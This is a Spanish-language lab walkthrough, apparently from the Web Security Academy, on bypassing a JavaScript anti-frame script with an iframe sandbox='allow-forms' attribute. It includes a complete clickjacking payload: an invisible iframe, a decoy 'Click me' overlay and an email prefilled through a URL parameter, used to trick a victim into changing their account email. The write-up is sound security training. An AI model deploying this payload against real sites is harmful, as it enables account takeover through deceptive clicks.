# 💻 Clickjacking con script anti-frame

## 📄 Descripción del laboratorio

La página `/my-account` intenta protegerse contra **Clickjacking** utilizando un script **anti-frame (frame buster)** que detecta si la página está cargada dentro de un iframe.

Sin embargo, esta defensa puede eludirse utilizando el atributo `sandbox` del iframe con la política `allow-forms`.

El objetivo es:

* Engañar al usuario para que haga clic en **Update email**.
* Utilizar un **email malicioso precargado mediante parámetro URL**.
* Actualizar su dirección de correo sin que lo perciba.

Credenciales de prueba:

```
wiener:peter
```

 

## 📚 Teoría

Este laboratorio muestra por qué los **scripts anti-frame basados en JavaScript no son defensas fiables**.

### 📌 Funcionamiento del anti-frame

El sitio incluye un script similar al siguiente:

```javascript
if (window.top !== window.self) {
  top.location = self.location;
}
```

Este código comprueba si la página se está cargando dentro de un iframe.\
Si lo detecta, fuerza la navegación fuera del iframe para impedir el ataque.

### 📌 Bypass mediante `sandbox`

El atributo `sandbox` permite restringir ciertas capacidades del contenido incrustado en un iframe.

Ejemplo utilizado en este laboratorio:

```javascript
sandbox="allow-forms"
```

Este atributo produce el siguiente efecto:

* Permite el envío de formularios.
* Bloquea la ejecución de JavaScript.

Como resultado:

* El script **anti-frame no puede ejecutarse**.
* El formulario sigue funcionando.
* El **token CSRF se envía automáticamente** desde la sesión de la víctima.
* La **precarga de datos mediante URL (`?email=`)** continúa funcionando.

Esto demuestra que depender exclusivamente de **JavaScript para proteger contra Clickjacking es una defensa frágil**.

### 3️⃣ Construcción del exploit

Se crea un exploit en el **Exploit Server** que:

1. Utiliza `sandbox="allow-forms"` para bloquear JavaScript.
2. Hace el iframe casi invisible.
3. Superpone un texto visible sobre el botón **Update email**.

Código del exploit:

```html
<style>
    iframe {
        width: 500px;
        height: 600px;
        opacity: 0.001;
        position: absolute;
        top: 0;
        left: 0;
    }
    div {
        position: absolute;
        top: 450px;
        left: 100px;
        font-size: 30px;
        color: red;
        pointer-events: none;
    }
</style>

<div>Click me</div>
<iframe sandbox="allow-forms" src="https://ID-DEL-LAB.web-security-academy.net/my-account?email=hacked@hacked.com"></iframe>
```

Elementos clave:

* `sandbox="allow-forms"` desactiva JavaScript y neutraliza el anti-frame.
* `opacity: 0.001` hace el iframe invisible pero clicable.
* El texto **Click me** se alinea con el botón real.
